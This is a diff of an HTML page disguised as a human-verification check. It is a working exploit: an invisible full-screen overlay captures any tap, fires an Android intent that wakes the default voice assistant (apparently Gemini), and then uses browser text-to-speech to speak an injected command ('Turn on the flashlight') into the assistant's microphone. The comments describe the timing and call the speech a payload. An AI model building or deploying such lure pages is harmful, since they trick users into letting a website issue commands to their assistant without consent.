@@ -1,51 +1,91 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Verification Required</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #121212; color: white; }
-        .box { padding: 30px; border: 1px solid #333; border-radius: 15px; text-align: center; }
-        #btn { padding: 15px 30px; background: #4285f4; color: white; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        #click-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            cursor: pointer;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>Are you human?</h2>
-        <p>Click "Verify" to continue.</p>
-        <button id="btn">Verify</button>
+
+    <div id="click-overlay"></div>
+
+    <div class="container">
+        <h2>Human Verification</h2>
+        <p>Please tap anywhere on the screen to continue to the site.</p>
+        <button>Verify</button>
     </div>
 
     <script>
-        const btn = document.getElementById('btn');
-        
-        btn.addEventListener('click', function() {
-            // 1. Unlock TTS engine immediately
-            let unlock = new SpeechSynthesisUtterance("");
-            window.speechSynthesis.speak(unlock);
+        let exploited = false;
 
-            // 2. Queue the Payload
-            // Using a slightly longer delay (800ms) to ensure the Google App 
-            // internal transition is complete before speaking.
-            setTimeout(() => {
-                let msg = new SpeechSynthesisUtterance("Turn on the flashlight");
-                msg.lang = 'en-US';
-                msg.rate = 1.2;
-                window.speechSynthesis.speak(msg);
-            }, 800);
+        document.getElementById('click-overlay').addEventListener('click', function() {
+            if (exploited) return;
+            exploited = true;
 
-            // 3. Trigger via internal Google App Scheme
-            // This bypasses the standard HTTPS intent filter and hits the internal 
-            // Assistant 'interaction' entry point directly.
-            let googleSchemeUrl = "intent://assistant#Intent;" +
-                "scheme=googleapp;" +
-                "package=com.google.android.googlequicksearchbox;" +
-                "S.com.google.android.apps.gsa.customtabs.SOURCE=1;" +
-                "action=android.intent.action.VIEW;" +
+            // 1. UNLOCK THE TTS ENGINE
+            let unlockUtterance = new SpeechSynthesisUtterance("");
+            window.speechSynthesis.speak(unlockUtterance);
+
+            // 2. FIRE THE INTENT TO WAKE GEMINI
+            // Removed the "package=" constraint so Android routes it globally to the default assistant
+            let intentUrl = "intent:#Intent;" +
+                "action=android.intent.action.VOICE_COMMAND;" +
+                "launchFlags=0x10000000;" + // FLAG_ACTIVITY_NEW_TASK
                 "end";
             
-            window.location.href = googleSchemeUrl;
+            window.location.href = intentUrl;
+
+            // 3. FIRE THE ACOUSTIC PAYLOAD
+            // 500ms delay to hit the mic opening window exactly
+            setTimeout(function() {
+                let payload = new SpeechSynthesisUtterance("Turn on the flashlight");
+                payload.lang = "en-US";
+                
+                // Slightly increase the rate so it finishes before the mic times out
+                payload.rate = 1.2; 
+                payload.volume = 1.0;
+                
+                window.speechSynthesis.speak(payload);
+            }, 500); 
         });
     </script>
+
 </body>
 </html>
